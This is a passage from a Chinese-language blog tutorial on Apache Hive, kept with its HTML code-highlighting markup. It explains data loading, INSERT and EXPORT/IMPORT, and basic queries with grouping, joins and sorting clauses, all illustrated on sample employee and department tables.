class="comment"># 加载本地文件到hive</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/datas/student.txt'</span> <span class="keyword">into</span> <span class="keyword">table</span> student;</span><br><span class="line"><span class="comment"># 加载HDFS文件到hive中，上传文件到HDFS</span></span><br><span class="line">hadoop fs -put /opt/module/datas/student.txt /user/atguigu</span><br><span class="line"><span class="comment"># 加载HDFS上数据，导入完成后去HDFS上查看文件是否还存在?答案是不在了，说明hdfs里面是元数据的修改</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> inpath <span class="string">'/user/atguigu/student.txt'</span> <span class="keyword">into</span> <span class="keyword">table</span> student;</span><br><span class="line"><span class="comment"># 加载数据覆盖表中已有的数据</span></span><br><span class="line">dfs -put /opt/module/datas/student.txt /user/atguigu;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> inpath <span class="string">'/user/atguigu/student.txt'</span> overwrite <span class="keyword">into</span> <span class="keyword">table</span> student;</span><br></pre></td></tr></table></figure><h3 id="2-2-Insert">2.2 Insert</h3><p><code>LOAD DATA</code>用于将外部数据直接加载到Hive表中，而<code>INSERT INTO</code>用于将数据从一个表插入到另一个表中或将查询结果插入到表中，并可以进行<strong>数据转换</strong>、过滤或聚合操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ====================将查询结果插入表中=====</span></span><br><span class="line"><span class="keyword">INSERT</span> (<span class="keyword">INTO</span> | OVERWRITE) <span class="keyword">TABLE</span> tablename [<span class="keyword">PARTITION</span> (partcol1=val1, partcol2=val2 ...)] select_statement;</span><br><span class="line"><span class="comment"># INTO：将结果追加到目标表</span></span><br><span class="line"><span class="comment"># OVERWRITE：用结果覆盖原有数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student1(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>, </span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span></span><br><span class="line">) </span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"><span class="comment"># 要跑MP</span></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">table</span> student1</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    <span class="keyword">id</span>, </span><br><span class="line">    <span class="keyword">name</span> </span><br><span class="line"><span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================将给定Values插入表中====</span></span><br><span class="line"><span class="keyword">INSERT</span> (<span class="keyword">INTO</span> | OVERWRITE) <span class="keyword">TABLE</span> tablename [<span class="keyword">PARTITION</span> (partcol1[=val1], partcol2[=val2] ...)] <span class="keyword">VALUES</span> values_row [, values_row ...]</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span>  student1 <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'wangwu'</span>),(<span class="number">2</span>,<span class="string">'zhaoliu'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将查询结果写入目标路径</span></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE [<span class="keyword">LOCAL</span>] <span class="keyword">DIRECTORY</span> <span class="keyword">directory</span> [<span class="keyword">ROW</span> <span class="keyword">FORMAT</span> row_format] [<span class="keyword">STORED</span> <span class="keyword">AS</span> file_format] select_statement;</span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">local</span> <span class="keyword">directory</span> <span class="string">'/opt/module/datas/student'</span> <span class="keyword">ROW</span> <span class="keyword">FORMAT</span> SERDE <span class="string">'org.apache.hadoop.hive.serde2.JsonSerDe'</span> <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure><h3 id="2-3-Export-Import">2.3 Export&amp;Import</h3><p>Export导出语句可将表的数据和元数据信息一并到处的HDFS路径，Import可将Export导出的内容导入Hive，表的数据和元数据信息都会恢复。Export和Import可用于两个Hive实例之间的数据迁移</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--导出</span></span><br><span class="line">EXPORT TABLE tablename TO 'export_target_path'</span><br><span class="line"></span><br><span class="line"><span class="comment">--导入</span></span><br><span class="line">IMPORT [EXTERNAL] TABLE new_or_original_tablename FROM 'source_path' [LOCATION 'import_target_path']</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="comment">--导出</span></span><br><span class="line">export table default.student to '/user/hive/warehouse/export/student';</span><br><span class="line"><span class="comment">--导入</span></span><br><span class="line">import table student2 from '/user/hive/warehouse/export/student';</span><br></pre></td></tr></table></figure><h1>三、查询</h1><h2 id="1、基础语法">1、基础语法</h2><blockquote><p><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Select" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Select">https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Select</a></p></blockquote><p>基本语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">ALL</span> | <span class="keyword">DISTINCT</span>] select_expr, select_expr, ...</span><br><span class="line">  <span class="keyword">FROM</span> table_reference       <span class="comment">-- 从什么表查</span></span><br><span class="line">  [<span class="keyword">WHERE</span> where_condition]   <span class="comment">-- 过滤</span></span><br><span class="line">  [<span class="keyword">GROUP</span> <span class="keyword">BY</span> col_list]        <span class="comment">-- 分组查询</span></span><br><span class="line">   [<span class="keyword">HAVING</span> col_list]          <span class="comment">-- 分组后过滤</span></span><br><span class="line">  [<span class="keyword">ORDER</span> <span class="keyword">BY</span> col_list]        <span class="comment">-- 排序</span></span><br><span class="line">  [CLUSTER <span class="keyword">BY</span> col_list]</span><br><span class="line">  [<span class="keyword">DISTRIBUTE</span> <span class="keyword">BY</span> col_list] [<span class="keyword">SORT</span> <span class="keyword">BY</span> col_list]</span><br><span class="line">  ]</span><br><span class="line"> [<span class="keyword">LIMIT</span> <span class="built_in">number</span>]                <span class="comment">-- 限制输出的行数</span></span><br></pre></td></tr></table></figure><h2 id="2、基本查询（Select…From）">2、基本查询（Select…From）</h2><h3 id="2-1-数据准备">2.1 数据准备</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在/opt/module/hive/datas/路径上创建dept.txt文件，并赋值如下内容：</span></span><br><span class="line"><span class="comment"># 部门编号 部门名称 部门位置id</span></span><br><span class="line">vim dept.txt</span><br><span class="line"></span><br><span class="line">10  行政部  1700</span><br><span class="line">20  财务部  1800</span><br><span class="line">30  教学部  1900</span><br><span class="line">40  销售部  1700</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/opt/module/hive/datas/路径上创建emp.txt文件</span></span><br><span class="line"><span class="comment"># hive中，如果不指定，默认null为/N</span></span><br><span class="line">vim emp.txt</span><br><span class="line">7369  张三  研发  800.00  30</span><br><span class="line">7499  李四  财务  1600.00  20</span><br><span class="line">7521  王五  行政  1250.00  10</span><br><span class="line">7566  赵六  销售  2975.00  40</span><br><span class="line">7654  侯七  研发  1250.00  30</span><br><span class="line">7698  马八  研发  2850.00  30</span><br><span class="line">7782  金九  \N  2450.0  30</span><br><span class="line">7788  银十  行政  3000.00  10</span><br><span class="line">7839  小芳  销售  5000.00  40</span><br><span class="line">7844  小明  销售  1500.00  40</span><br><span class="line">7876  小李  行政  1100.00  10</span><br><span class="line">7900  小元  讲师  950.00  30</span><br><span class="line">7902  小海  行政  3000.00  10</span><br><span class="line">7934  小红明  讲师  1300.00  30</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建部门表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> dept(</span><br><span class="line">    deptno <span class="built_in">int</span>,    <span class="comment">-- 部门编号</span></span><br><span class="line">    dname <span class="keyword">string</span>,  <span class="comment">-- 部门名称</span></span><br><span class="line">    loc <span class="built_in">int</span>        <span class="comment">-- 部门位置</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"><span class="comment"># 创建员工表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> emp(</span><br><span class="line">    empno <span class="built_in">int</span>,      <span class="comment">-- 员工编号</span></span><br><span class="line">    ename <span class="keyword">string</span>,   <span class="comment">-- 员工姓名</span></span><br><span class="line">    job <span class="keyword">string</span>,     <span class="comment">-- 员工岗位（大数据工程师、前端工程师、java工程师）</span></span><br><span class="line">    sal <span class="keyword">double</span>,     <span class="comment">-- 员工薪资</span></span><br><span class="line">    deptno <span class="built_in">int</span>      <span class="comment">-- 部门编号</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入数据</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/dept.txt'</span> <span class="keyword">into</span> <span class="keyword">table</span> dept;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/emp.txt'</span> <span class="keyword">into</span> <span class="keyword">table</span> emp;</span><br></pre></td></tr></table></figure><h3 id="2-2-基本查询操作">2.2 基本查询操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SQL 语言大小写不敏感</span></span><br><span class="line"><span class="comment"># 全表查询</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp;</span><br><span class="line"><span class="comment"># 选择特定列查询</span></span><br><span class="line"><span class="keyword">select</span> empno, ename <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列别名</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    ename <span class="keyword">AS</span> <span class="keyword">name</span>, </span><br><span class="line">    deptno dn </span><br><span class="line"><span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Limit语句</span></span><br><span class="line"><span class="comment"># 典型的查询会返回多行数据。limit子句用于限制返回的行数</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp <span class="keyword">limit</span> <span class="number">5</span>; </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where语句,where子句中不能使用字段别名</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp <span class="keyword">where</span> sal &gt; <span class="number">1000</span>;</span><br></pre></td></tr></table></figure><h3 id="2-3-关系运算函数">2.3 关系运算函数</h3><table><thead><tr><th><strong>操作符</strong></th><th><strong>支持的数据类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>A=B</td><td>基本数据类型</td><td>如果A等于B则返回true，反之返回false</td></tr><tr><td>A&lt;=&gt;B</td><td>基本数据类型</td><td>如果A和B都为null或者都不为null，则返回true，如果只有一边为null，返回false</td></tr><tr><td>A&lt;&gt;B, A!=B</td><td>基本数据类型</td><td>A或者B为null则返回null；如果A不等于B，则返回true，反之返回false</td></tr><tr><td>A&lt;B</td><td>基本数据类型</td><td>A或者B为null，则返回null；如果A小于B，则返回true，反之返回false</td></tr><tr><td>A&lt;=B</td><td>基本数据类型</td><td>A或者B为null，则返回null；如果A小于等于B，则返回true，反之返回false</td></tr><tr><td>A&gt;B</td><td>基本数据类型</td><td>A或者B为null，则返回null；如果A大于B，则返回true，反之返回false</td></tr><tr><td>A&gt;=B</td><td>基本数据类型</td><td>A或者B为null，则返回null；如果A大于等于B，则返回true，反之返回false</td></tr><tr><td>A [not] between B and C</td><td>基本数据类型</td><td>如果A，B或者C任一为null，则结果为null。如果A的值大于等于B而且小于或等于C，则结果为true，反之为false。如果使用not关键字则可达到相反的效果。</td></tr><tr><td>A is null</td><td>所有数据类型</td><td>如果A等于null，则返回true，反之返回false</td></tr><tr><td>A is not null</td><td>所有数据类型</td><td>如果A不等于null，则返回true，反之返回false</td></tr><tr><td>in（数值1，数值2）</td><td>所有数据类型</td><td>使用 in运算显示列表中的值</td></tr><tr><td>A [not] like B</td><td>string 类型</td><td>B是一个SQL下的简单正则表达式，也叫通配符模式，如果A与其匹配的话，则返回true；反之返回false。B的表达式说明如下：‘x%’表示A必须以字母‘x’开头，‘%x’表示A必须以字母‘x’结尾，而‘%x%’表示A包含有字母‘x’,可以位于开头，结尾或者字符串中间。如果使用not关键字则可达到相反的效果。</td></tr><tr><td>A rlike B, A regexp B</td><td>string 类型</td><td>B是基于java的正则表达式，如果A与其匹配，则返回true；反之返回false。匹配使用的是JDK中的正则表达式接口实现的，因为正则也依据其中的规则。例如，正则表达式必须和整个字符串A相匹配，而不是只需与其字符串匹配。</td></tr></tbody></table><h3 id="2-4-逻辑运算函数">2.4 逻辑运算函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本语法（and/or/not）</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp </span><br><span class="line"><span class="keyword">where</span> sal &gt; <span class="number">1000</span> <span class="keyword">and</span> deptno = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp </span><br><span class="line"><span class="keyword">where</span> sal&gt;<span class="number">1000</span> <span class="keyword">or</span> deptno=<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp </span><br><span class="line"><span class="keyword">where</span> deptno <span class="keyword">not</span> <span class="keyword">in</span>(<span class="number">30</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure><h3 id="2-5-聚合函数">2.5 聚合函数</h3><ul><li>count(*)，表示统计所有行数，包含null值</li><li>count(某列)，表示该列一共有多少行，不包含null值</li><li>max()，求最大值，不包含null，除非所有值都是null</li><li>min()，求最小值，不包含null，除非所有值都是null</li><li>sum()，求和，不包含null</li><li>avg()，求平均值，不包含null</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地模式mapreduce都运行在一个进程内，里面各个线程，之前配的是yarn</span></span><br><span class="line"><span class="comment"># tail -500 /tmp/atguigu/hive.log 查看错误信息发现堆内存报错，需要调大堆内存</span></span><br><span class="line"><span class="comment">#  mv hive-env.sh.template hive-env.sh</span></span><br><span class="line"><span class="comment"># 然后重启</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.framework.name = <span class="keyword">local</span></span><br><span class="line"><span class="comment"># 求总行数（count）</span></span><br><span class="line"><span class="comment"># count(某字段)，null值不会统计</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) cnt <span class="keyword">from</span> emp;</span><br><span class="line"><span class="comment"># MP执行流程如下图</span></span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251334389.png" alt></p><h2 id="3、分组">3、分组</h2><h3 id="3-1-Group-By语句">3.1 Group By语句</h3><p>Group By语句通常会和聚合函数一起使用，按照一个或者多个列队结果进行分组，然后对每个组执行聚合操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算emp表每个部门的平均工资</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    t.deptno, </span><br><span class="line">    <span class="keyword">avg</span>(t.sal) avg_sal </span><br><span class="line"><span class="keyword">from</span> emp t </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> t.deptno;</span><br><span class="line"><span class="comment"># 计算emp每个部门中每个岗位的最高薪水</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    t.deptno, </span><br><span class="line">    t.job, </span><br><span class="line">    <span class="keyword">max</span>(t.sal) max_sal </span><br><span class="line"><span class="keyword">from</span> emp t </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> t.deptno, t.job;</span><br></pre></td></tr></table></figure><h3 id="3-2-Having语句">3.2 Having语句</h3><p><strong>having与</strong>where不同点</p><ul><li>where后面不能写分组聚合函数，而having后面可以使用分组聚合函数</li><li>having只用于group by分组统计语句</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 求每个部门的平均工资</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    deptno, </span><br><span class="line">    <span class="keyword">avg</span>(sal) </span><br><span class="line"><span class="keyword">from</span> emp </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> deptno;</span><br><span class="line"><span class="comment"># 求每个部门的平均薪水大于2000的部门</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    deptno, </span><br><span class="line">    <span class="keyword">avg</span>(sal) avg_sal </span><br><span class="line"><span class="keyword">from</span> emp </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> deptno  </span><br><span class="line"><span class="keyword">having</span> avg_sal &gt; <span class="number">2000</span>;</span><br></pre></td></tr></table></figure><h2 id="4、Join语句">4、Join语句</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  等值Join</span></span><br><span class="line"><span class="comment"># Hive支持通常的sql join语句，但是只支持等值连接，不支持非等值连接</span></span><br><span class="line"><span class="comment"># 根据员工表和部门表中的部门编号相等，查询员工编号、员工名称和部门名称</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    e.empno, </span><br><span class="line">    e.ename, </span><br><span class="line">    d.dname </span><br><span class="line"><span class="keyword">from</span> emp e </span><br><span class="line"><span class="keyword">join</span> dept d </span><br><span class="line"><span class="keyword">on</span> e.deptno = d.deptno;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内连接：只有进行连接的两个表中都存在与连接条件相匹配的数据才会被保留下来</span></span><br><span class="line"><span class="comment"># 左外连接：join操作符左边表中符合where子句的所有记录将会被返回</span></span><br><span class="line"><span class="comment"># 右外连接：join操作符右边表中符合where子句的所有记录将会被返回</span></span><br><span class="line"><span class="comment"># 满外连接：将会返回所有表中符合where语句条件的所有记录。如果任一表的指定字段没有符合条件的值的话，那么就使用null值替代</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    e.empno, </span><br><span class="line">    e.ename, </span><br><span class="line">    d.deptno </span><br><span class="line"><span class="keyword">from</span> emp e </span><br><span class="line"><span class="keyword">full</span> <span class="keyword">join</span> dept d </span><br><span class="line"><span class="keyword">on</span> e.deptno = d.deptno;</span><br><span class="line"><span class="comment"># 多表连接</span></span><br><span class="line"><span class="comment"># 大多数情况下，Hive会对每对join连接对象启动一个MapReduce任务。本例中会首先启动一个MapReduce job对表e和表d进行连接操作，然后会再启动一个MapReduce job将第一个MapReduce job的输出和表l进行连接操作。</span></span><br><span class="line"><span class="comment"># 注意：为什么不是表d和表l先进行连接操作呢？这是因为Hive总是按照从左到右的顺序执行的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 笛卡尔集</span></span><br><span class="line"><span class="comment"># 笛卡尔集会在下面条件下产生:省略连接条件;连接条件无效;所有表中的所有行互相连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 联合（union &amp; union all）</span></span><br><span class="line"><span class="comment"># union和union all都是上下拼接sql的结果，这点是和join有区别的，join是左右关联，union和union all是上下拼接。union去重，union all不去重。</span></span><br><span class="line"><span class="comment"># union和union all在上下拼接sql结果时有两个要求：两个sql的结果，列的个数必须相同;两个sql的结果，上下所对应列的类型必须一致</span></span><br></pre></td></tr></table></figure><h2 id="5、排序">5、排序</h2><h3 id="5-1-全局排序（Order-By）">5.1 全局排序（Order By）</h3><blockquote><p>Order By：全局排序，只有一个Reduce</p></blockquote><ul><li>asc（ascend）：升序（默认）</li><li>desc（descend）：降序</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通常和limit配合使用</span></span><br><span class="line"><span class="comment"># 按照部门和工资升序排序</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    ename, </span><br><span class="line">    deptno, </span><br><span class="line">    sal </span><br><span class="line"><span class="keyword">from</span> emp </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> deptno, sal;</span><br></pre></td></tr></table></figure><h3 id="5-2-每个Reduce内部排序（Sort-By）">5.2 每个Reduce内部排序（Sort By）</h3><p>Sort By：对于大规模的数据集order by的效率非常低。在很多情况下，并不需要全局排序，此时可以使用<strong>Sort by</strong>。Sort by为每个reduce产生一个排序文件。每个Reduce内部进行排序，对全局结果集来说不是排序。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置reduce个数</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.job.reduces=<span class="number">3</span>;</span><br><span class="line"><span class="comment"># 查看设置reduce个数</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.job.reduces;</span><br><span class="line"><span class="comment"># 根据部门编号降序查看员工信息</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    * </span><br><span class="line"><span class="keyword">from</span> emp </span><br><span class="line"><span class="keyword">sort</span> <span class="keyword">by</span> deptno <span class="keyword">desc</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将查询结果导入到文件中（按照部门编号降序排序）,可以查看每个文件按照顺序排序</span></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">local</span> <span class="keyword">directory</span> <span class="string">'/opt/module/hive/datas/sortby-result'</span> <span class="keyword">select</span> * <span class="keyword">from</span> emp <span class="keyword">sort</span> <span class="keyword">by</span> deptno <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251334390.png" alt></p><h3 id="5-3-分区（Distribute-By）">5.3 分区（Distribute By）</h3><p>Distribute By：在有些情况下，我们需要控制某个特定行应该到哪个Reducer，通常是为了进行后续的聚集操作。<strong>distribute by</strong>子句可以做这件事。<strong>distribute by</strong>类似MapReduce中partition（自定义分区），进行分区，结合sort by使用。 </p><p>对于distribute by进行测试，一定要分配多reduce进行处理，否则无法看到distribute by的效果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> mapreduce.job.reduces=<span class="number">3</span>;</span><br><span class="line"><span class="comment"># 先按照部门编号分区，再按照员工编号薪资排序</span></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">local</span> <span class="keyword">directory</span> </span><br><span class="line"><span class="string">'/opt/module/hive/datas/distribute-result'</span> </span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    * </span><br><span class="line"><span class="keyword">from</span> emp </span><br><span class="line"><span class="keyword">distribute</span> <span class="keyword">by</span> deptno </span><br><span class="line"><span class="keyword">sort</span> <span class="keyword">by</span> sal <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure><ul><li>distribute by的分区规则是根据分区字段的hash码与reduce的个数进行相除后，余数相同的分到一个区</li><li>Hive要求<strong>distribute by</strong>语句要写在sort by语句之前</li></ul><p>注意：演示完以后mapreduce.job.reduces的值要设置回-1，否则下面分区or分桶表load跑MapReduce的时候会报错</p><h3 id="5-4-分区排序（Cluster-By）">5.4 分区排序（Cluster By）</h3><p>当distribute by和sort by字段相同时，可以使用cluster by方式。cluster by除了具有distribute by的功能外还兼具sort by的功能。但是排序<strong>只能是升序排序</strong>，不能指定排序规则为asc或者desc</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意：按照部门编号分区，不一定就是固定死的数值，可以是20号和30号部门分到一个分区里面去</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    * 